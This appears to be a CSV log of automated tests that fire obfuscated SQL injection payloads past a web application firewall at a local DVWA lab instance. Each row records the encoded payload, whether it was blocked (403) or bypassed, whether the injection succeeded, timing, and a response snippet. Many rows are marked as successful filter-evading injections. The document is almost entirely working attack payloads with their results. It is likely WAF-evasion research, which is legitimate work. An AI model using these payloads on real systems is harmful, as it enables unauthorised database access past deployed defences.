Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=.1%0b||%0bnot%0b{x%0b(select+1)}=1=+(not+{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0214,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0b||%0bnot%0b{x%0b(select+1)}=1=+(not%0b{x%0b(select+1)}=1),Bypassed,No,None,Invalid,0.0386,71.21,No,500,
0%27<@=.1%0bor%0b!%0b{x+(select%0b1)}=1=+(not%0b{x+(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0365,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or+@<@.%0bor+!+{`if`%0b1}=1=%0b(not%0b{x+(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0294,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0bnot+{a+1}=1=+(not%0b{x%0b(select+1)}=1)+,Bypassed,No,None,Invalid,0.0439,71.21,No,500,
0'<@=.1+or+not+{x+(select+1)}=1=+(!%0b{x%0b(select+1)}=1),Blocked,No,None,Invalid,0.0273,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or+not+{x%0b(select+1)}=1=%0b(!%0b{x+(select+1)}=1),Bypassed,No,None,Invalid,0.0306,71.21,No,500,
0'<@!=1.+or%0bnot+1=+(not%0b{`if`+1}=1)+or',Bypassed,No,None,Invalid,0.038,71.21,No,500,
0%27<@=.1%0b||%0b!+{x%0b(select%0b1)}=1=%0b(not%0b{`if`+1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0174,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor%0b!+1=+(not+{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0211,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||%0b!%7efalse=+(not%0b{a+1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0356,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||+not%7efalse=%0b(not%0b{x%0b(select+1)}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0624,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+not%7efalse=+(!+{x+(select%0b1)}=1)%0b||%27,Bypassed,No,None,Invalid,0.0239,71.21,No,500,
0%27<@!=1%0bor+!+{a+1}=1=%0b(!%7efalse)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0319,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||+!%0b{x%0b(select%0b1)}=1=+(not+{a%0b1}=1)--,Bypassed,No,None,Invalid,0.0202,71.21,No,500,
0'<@!=1+||+not%7efalse=%0b(!~0)+||',Bypassed,No,None,Invalid,0.0501,71.42,No,500,
0%27<@!=.1+or+not+{x+(select+1)}=1=+(!%0b{a+1}=1)+,Blocked,No,None,Invalid,0.0211,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+or+{x+(select+1)}=1+like%0b{x+(select%0b1)}=1+or%27,Blocked,No,None,Invalid,0.0113,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+!+{`if`%0b1}=1=%0b(!+{x%0b(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0288,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0bnot+{`if`+1}=1=+(!%0b{a+1}=1)+or',Bypassed,No,None,Invalid,0.0434,71.63,No,500,
0'<@=1.%0b||%0b0=%0b(0)%23,Bypassed,No,None,Invalid,0.0153,71.63,No,500,
0%27<@=1+or+!%0b{`if`+1}=1=%0b(0)+or',Bypassed,No,None,Invalid,0.0147,71.63,No,500,
0%27<@=.1+||+not%0b{`if`%0b1}=1=+(not+{x+(select+1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0328,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or%0b!~0=%0b(not%0b{x%0b(select%0b1)}=1)%0b||%27,Bypassed,No,None,Invalid,0.0197,71.63,No,500,
0%27<@!=.1+or+not%0b{x+(select+1)}=1=+(not+1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0538,71.63,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0b!+{`if`+1}=1=%0b(not%0b{x%0b(select+1)}=1)%0b,Bypassed,No,None,Invalid,0.0399,71.63,No,500,
0'<@!=1.+or+!%0b1=%0b(!+{x+(select+1)}=1)+||%27,Blocked,No,None,Invalid,0.032,71.63,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or%0bnot%0btrue=+(not+{x+(select%0b1)}=1)+||',Bypassed,No,None,Invalid,0.0253,71.63,No,500,
0'<@!=.1+or%0b{x+(select+1)}=1+like%0b{x%0b(select%0b1)}=1--+,Bypassed,No,None,Invalid,0.0568,71.63,No,500,
0'<@=1%0bor%0b!+{`if`%0b1}=1=%0b(!%0b{a%0b1}=1)+or%27,Bypassed,No,None,Invalid,0.01,71.63,No,500,
0'<@=1.+||%0bnot+{x%0b(select+1)}=1=+(!%0b{x+(select+1)}=1),Bypassed,No,None,Invalid,0.0281,69.42,No,500,
0'<@!=.1+||%0bnot+{x+(select+1)}=1=+(!+{x+(select%0b1)}=1),Blocked,No,None,Invalid,0.025,70.0,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or+!+{x+(select+1)}=1=+(!%0b{a+1}=1)--,Blocked,No,None,Invalid,0.0208,70.04,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0b||%0bnot+{`if`+1}=1=%0b(!%0b{x+(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0286,70.94,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+!%0b{x+(select%0b1)}=1=+(not+{`if`+1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0237,71.04,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0b!+{x+(select+1)}=1=+(!+{a+1}=1)+,Blocked,No,None,Invalid,0.0417,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or%0bnot%7efalse=%0b(!+{`if`+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0386,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor%0b{x+(select+1)}=1+like+{x+(select%0b1)}=1+||',Bypassed,No,None,Invalid,0.0314,71.21,No,500,
0'<@!=.1+or%0b!%0b{x%0b(select%0b1)}=1=+(not+{a%0b1}=1)%23,Blocked,No,None,Invalid,0.0457,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0b||+!%0b{x+(select+1)}=1=+(!%0b{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0367,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0bfalse=+(!%0b{a%0b1}=1)+or',Bypassed,No,None,Invalid,0.043,71.21,No,500,
0%27<@!=1%0b||%0bnot+{x+(select%0b1)}=1=+(not%0b{x+(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0494,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor+!+true=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0189,71.21,No,500,
0%27<@=1.+||+not%0b{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0384,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor%0b!%0btrue=+(not+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0136,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor%0bnot~false=+(not+{x%0b(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0376,71.21,No,500,
0%27<@!=.1%0b||+!+{a+1}=1=+(!+true)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0276,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||%0b!%0b{x%0b(select+1)}=1=%0b(!~0)+||',Bypassed,No,None,Invalid,0.0227,71.21,No,500,
0%27<@=1.%0bor+not+{x%0b(select+1)}=1=+(not%0b{a+1}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0183,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not+{x+(select%0b1)}=1=%0b(not+1)+or%27,Blocked,No,None,Invalid,0.0595,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+or%0b!%0b{`if`%0b1}=1=%0b(!%7efalse)%0b||',Bypassed,No,None,Invalid,0.02,71.21,No,500,
0%27<@=1.+or+not+{a%0b1}=1=+(not%7efalse)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0294,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0bnot+{x+(select+1)}=1=%0b(!+{a+1}=1)+,Bypassed,No,None,Invalid,0.037,71.21,No,500,
0%27<@!=1.%0b||%0b!~false+is%0bfalse--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0522,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
